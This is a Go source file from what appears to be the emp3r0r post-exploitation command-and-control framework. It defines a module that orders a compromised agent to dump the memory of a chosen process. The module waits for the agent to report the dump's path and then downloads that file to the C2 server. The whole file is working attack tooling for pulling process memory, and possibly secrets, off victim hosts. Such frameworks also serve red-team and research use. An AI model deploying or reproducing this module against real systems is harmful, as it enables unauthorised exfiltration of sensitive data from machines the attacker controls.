package modules

import (
	"fmt"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/server"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func moduleMemDump() {
	pidOpt, ok := live.AvailableModuleOptions["pid"]
	if !ok {
		logging.Errorf("Option 'pid' not found")
		return
	}
	cmd := fmt.Sprintf("%s --pid %s", def.C2CmdMemDump, pidOpt.Val)
	cmd_id := uuid.NewString()
	err := agents.SendCmd(cmd, cmd_id, live.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	logging.Printf("Please wait for agent's response...")

	var cmd_res string
	for i := 0; i < 100; i++ {
		// check if the command has finished
		res, ok := live.CmdResults[cmd_id] // check if the command has finished
		if ok {
			cmd_res = res
			live.CmdResultsMutex.Lock()
			delete(live.CmdResults, cmd_id)
			live.CmdResultsMutex.Unlock()
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	path := cmd_res
	if path == "" || strings.HasPrefix(path, "Error") {
		logging.Errorf("Failed to get memdump file path: invalid response")
		return
	}

	_, err = server.GetFile(path, live.ActiveAgent)
	if err != nil {
		logging.Errorf("GetFile: %v", err)
		return
	}
}
